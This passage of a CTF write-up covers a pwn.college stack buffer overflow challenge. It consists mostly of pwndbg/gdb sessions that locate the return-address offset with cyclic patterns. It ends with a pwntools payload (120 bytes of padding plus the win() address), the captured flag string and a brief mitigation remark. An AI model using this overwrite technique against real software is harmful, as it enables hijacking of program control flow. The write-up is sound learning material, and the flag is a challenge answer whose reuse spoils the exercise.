05:0028│-040     0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— ...
06:0030│-038     0x7fffffffc9c8 ◂— 0x1000
07:0038│ rax rsi 0x7fffffffc9d0 ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7ebaa80 read
   1         0x401677 challenge+130
   2         0x401779 main+149
   3   0x7ffff7dc91ca __libc_start_call_main+122
   4   0x7ffff7dc928b __libc_start_main+139
   5         0x4011be _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> finish
Run till exit from #0  __GI___libc_read (fd=0, buf=0x7fffffffc9d0, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
0x0000000000401677 in challenge ()
Value returned is $1 = 404
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
*RAX  0x194
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
*RCX  0x7ffff7ebaa91 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 0x6162616161612762 ("b'aaaaba")
 R8   0x26
 R9   0
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 ◂— 0x616e6161616d6161 ('aamaaana')
*RSP  0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 0x616e6161616d6161 ('aamaaana')
*RIP  0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x401677 <challenge+130>    mov    dword ptr [rbp - 0x3c], eax     [0x7fffffffc9c4] <= 0x194
   0x40167a <challenge+133>    cmp    dword ptr [rbp - 0x3c], 0       0x194 - 0x0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x40167e <challenge+137>  ✔ jns    challenge+183               <challenge+183>
    ↓
   0x4016ac <challenge+183>    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7fffffffc9e8] => 0x61676161
   0x4016af <challenge+186>    test   eax, eax                        0x61676161 & 0x61676161     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x4016b1 <challenge+188>  ✘ je     challenge+200               <challenge+200>

   0x4016b3 <challenge+190>    mov    eax, 0                          EAX => 0
   0x4016b8 <challenge+195>    call   win                         <win>

   0x4016bd <challenge+200>    lea    rdi, [rip + 0xa98]              RDI => 0x40215c ◂— 'Goodbye!'
   0x4016c4 <challenge+207>    call   puts@plt                    <puts@plt>

   0x4016c9 <challenge+212>    mov    eax, 0                          EAX => 0
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 0x616e6161616d6161 ('aamaaana')
01:0008│-058 0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
02:0010│-050 0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
03:0018│-048 0x7fffffffc9b8 ◂— 0x1f7fa35c0
04:0020│-040 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 0x616e6161616d6161 ('aamaaana')
05:0028│-038 0x7fffffffc9c8 ◂— 0x1000
06:0030│ rsi 0x7fffffffc9d0 ◂— 0x6162616161612762 ("b'aaaaba")
07:0038│-028 0x7fffffffc9d8 ◂— 0x6164616161636161 ('aacaaada')
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401677 challenge+130
   1 0x61706161616f6161 None
   2 0x6172616161716161 None
   3 0x6174616161736161 None
   4 0x6176616161756161 None
   5 0x6178616161776161 None
   6 0x617a616161796161 None
   7 0x6163626161626261 None
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $rip+8
0x40167f <challenge+138>:       ",\350[\372\377\377\213"
pwndbg> x/s $rip
0x401677 <challenge+130>:       "\211Eă", <incomplete sequence \304>
pwndbg> x/gx $rbp+8
0x7fffffffca08: 0x61706161616f6161

------- tip of the day (disable with set show-tips off) -------
If you have debugging symbols the info args command shows current frame's function arguments (use up and down to switch between frames)
pwndbg> break read
Breakpoint 1 at 0x401140
pwndbg> r
Starting program: /home/ss/binary-exploitation-first-overflow
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Send your payload (up to 4096 bytes)!

Breakpoint 1, __GI___libc_read (fd=0, buf=0x7fffffffc9d0, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
warning: 25     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffc9d0 ◂— 0
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 0
 R8   0x26
 R9   0
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
 RSP  0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
 RIP  0x7ffff7ebaa80 (read) ◂— endbr64
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7ebaa80 <read>       endbr64
   0x7ffff7ebaa84 <read+4>     cmp    byte ptr [rip + 0xef5b5], 0     1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x7ffff7ebaa8b <read+11>  ✘ je     read+32                     <read+32>

   0x7ffff7ebaa8d <read+13>    xor    eax, eax         EAX => 0
   0x7ffff7ebaa8f <read+15>    syscall  <SYS_read>
   0x7ffff7ebaa91 <read+17>    cmp    rax, -0x1000
   0x7ffff7ebaa97 <read+23>    ja     read+104                    <read+104>

   0x7ffff7ebaa99 <read+25>    ret

   0x7ffff7ebaa9a <read+26>    nop    word ptr [rax + rax]
   0x7ffff7ebaaa0 <read+32>    push   rbp
   0x7ffff7ebaaa1 <read+33>    mov    rbp, rsp
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
01:0008│-060     0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 ◂— ...
02:0010│-058     0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
03:0018│-050     0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
04:0020│-048     0x7fffffffc9b8 ◂— 0x1f7fa35c0
05:0028│-040     0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— ...
06:0030│-038     0x7fffffffc9c8 ◂— 0x1000
07:0038│ rax rsi 0x7fffffffc9d0 ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7ebaa80 read
   1         0x401677 challenge+130
   2         0x401779 main+149
   3   0x7ffff7dc91ca __libc_start_call_main+122
   4   0x7ffff7dc928b __libc_start_main+139
   5         0x4011be _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> finish
Run till exit from #0  __GI___libc_read (fd=0, buf=0x7fffffffc9d0, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
0x0000000000401677 in challenge ()
Value returned is $1 = 59
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
*RAX  0x3b
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
*RCX  0x7ffff7ebaa91 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
 R8   0x26
 R9   0
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 ◂— 'AAAAAABBBB\n'
*RSP  0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
*RIP  0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x401677 <challenge+130>    mov    dword ptr [rbp - 0x3c], eax     [0x7fffffffc9c4] <= 0x3b
   0x40167a <challenge+133>    cmp    dword ptr [rbp - 0x3c], 0       0x3b - 0x0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x40167e <challenge+137>  ✔ jns    challenge+183               <challenge+183>
    ↓
   0x4016ac <challenge+183>    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7fffffffc9e8] => 0x41414141
   0x4016af <challenge+186>    test   eax, eax                        0x41414141 & 0x41414141     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
   0x4016b1 <challenge+188>  ✘ je     challenge+200               <challenge+200>

   0x4016b3 <challenge+190>    mov    eax, 0                          EAX => 0
   0x4016b8 <challenge+195>    call   win                         <win>

   0x4016bd <challenge+200>    lea    rdi, [rip + 0xa98]              RDI => 0x40215c ◂— 'Goodbye!'
   0x4016c4 <challenge+207>    call   puts@plt                    <puts@plt>

   0x4016c9 <challenge+212>    mov    eax, 0                          EAX => 0
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
01:0008│-058 0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
02:0010│-050 0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
03:0018│-048 0x7fffffffc9b8 ◂— 0x1f7fa35c0
04:0020│-040 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
05:0028│-038 0x7fffffffc9c8 ◂— 0x1000
06:0030│ rsi 0x7fffffffc9d0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
07:0038│-028 0x7fffffffc9d8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401677 challenge+130
   1          0xa4242 None
   2             0x30 None
   3   0x7fffffffdb78 None
   4   0x7fffffffdb68 None
   5      0x100000380 None
   6            0x380 None
   7            0x380 None
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> finish
Run till exit from #0  0x0000000000401677 in challenge ()
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0xa4242

Command aborted.
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x3b
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RCX  0x7ffff7ebaa91 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
 R8   0x26
 R9   0
 R10  0
 R11  0x246
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 ◂— 'AAAAAABBBB\n'
 RSP  0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
 RIP  0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x401677 <challenge+130>    mov    dword ptr [rbp - 0x3c], eax     [0x7fffffffc9c4] <= 0x3b
   0x40167a <challenge+133>    cmp    dword ptr [rbp - 0x3c], 0       0x3b - 0x0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x40167e <challenge+137>  ✔ jns    challenge+183               <challenge+183>
    ↓
   0x4016ac <challenge+183>    mov    eax, dword ptr [rbp - 0x18]     EAX, [0x7fffffffc9e8] => 0x41414141
   0x4016af <challenge+186>    test   eax, eax                        0x41414141 & 0x41414141     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
   0x4016b1 <challenge+188>  ✘ je     challenge+200               <challenge+200>

   0x4016b3 <challenge+190>    mov    eax, 0                          EAX => 0
   0x4016b8 <challenge+195>    call   win                         <win>

   0x4016bd <challenge+200>    lea    rdi, [rip + 0xa98]              RDI => 0x40215c ◂— 'Goodbye!'
   0x4016c4 <challenge+207>    call   puts@plt                    <puts@plt>

   0x4016c9 <challenge+212>    mov    eax, 0                          EAX => 0
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
01:0008│-058 0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
02:0010│-050 0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
03:0018│-048 0x7fffffffc9b8 ◂— 0x1f7fa35c0
04:0020│-040 0x7fffffffc9c0 —▸ 0x7fffffffca00 ◂— 'AAAAAABBBB\n'
05:0028│-038 0x7fffffffc9c8 ◂— 0x1000
06:0030│ rsi 0x7fffffffc9d0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
07:0038│-028 0x7fffffffc9d8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n'
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401677 challenge+130
   1          0xa4242 None
   2             0x30 None
   3   0x7fffffffdb78 None
   4   0x7fffffffdb68 None
   5      0x100000380 None
   6            0x380 None
   7            0x380 None
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $rip
0x401677 <challenge+130>:       "\211Eă", <incomplete sequence \304>
pwndbg> x/8bx $rsp
0x7fffffffc9a0: 0xc0    0xc9    0xff    0xff    0xff    0x7f    0x00    0x00
pwndbg> x/8bx $rbp+8
0x7fffffffca08: 0x42    0x42    0x0a    0x00    0x00    0x00    0x00    0x00
pwndbg>
```


this is the important part : when i used cyclic find i found out the the offset to overwrite the return address is 120 + win address which again got me flag.

```bash
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ gdb ./binary-exploitation-first-overflow
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./binary-exploitation-first-overflow...
(No debugging symbols found in ./binary-exploitation-first-overflow)
(gdb) break read
Breakpoint 1 at 0x401140
(gdb) finish
The program is not being run.
(gdb) run
Starting program: /challenge/binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!

Breakpoint 1, __GI___libc_read (fd=0, buf=0x7ffc847b4190, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
warning: 25     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
(gdb) finish
Run till exit from #0  __GI___libc_read (fd=0, buf=0x7ffc847b4190, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
0x0000000000402260 in challenge ()
Value returned is $1 = 401
(gdb) x/gx $rip
0x402260 <challenge+131>:       0x7900847d83844589
(gdb) x/gx $rbp
0x7ffc847b4200: 0x6261616562616164
(gdb) x/s rsp
No symbol "rsp" in current context.
(gdb) x/s $rsp
0x7ffc847b4160: "\034"
(gdb) x/s $rip
0x402260 <challenge+131>:       "\211E\204\203}\204"
(gdb) x/s $rbp+8
0x7ffc847b4208: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaad"...
(gdb)
0x7ffc847b42d0: "faadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad\n"
(gdb) exit
A debugging session is active.

        Inferior 1 [process 363] will be killed.

Quit anyway? (y or n) n
Not confirmed.
(gdb) c
Continuing.
You win! Here is your flag:

  ERROR: Failed to open the flag -- Permission denied!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
[Inferior 1 (process 363) exited with code 0377]
(gdb) exit
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ ipython
Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322]
Type 'copyright', 'credits' or 'license' for more information
IPython 9.2.0 -- An enhanced Interactive Python. Type '?' for help.
Tip: Use `--theme`, or the `%colors` magic to change IPython's themes and colors.

In [1]: print(cyclic_find("faab"))
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
Cell In[1], line 1
----> 1 print(cyclic_find("faab"))

NameError: name 'cyclic_find' is not defined

In [2]: from pwn import *

In [3]: print(cyclic_find("faab"))
120

In [4]: r = process('./binary-exploitation-first-overflow')
[x] Starting local process './binary-exploitation-first-overflow'
[+] Starting local process './binary-exploitation-first-overflow': pid 373

In [5]: r.send(b'A'*120 + p64(0x4014ee))

In [6]: r.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow' stopped with exit code -6 (SIGABRT) (pid 373)
[x] Receiving all data: 178B
[+] Receiving all data: Done (178B)
Out[6]: b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{gw_GIYEwaLZtw8v-BaLkcf1ZMna.0FM5IDLzQjN0czW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'

In [7]:
```
i could also overwrite the win variable by sending 98 bytes of 'A' and 42 as an integer which yielded the same result


# The flag :

`pwn.college{gw_GIYEwaLZtw8v-BaLkcf1ZMna.0FM5IDLzQjN0czW}`

# mitigation :

this issue can be prevented by proper input sanitisation and always keeping track of size of input.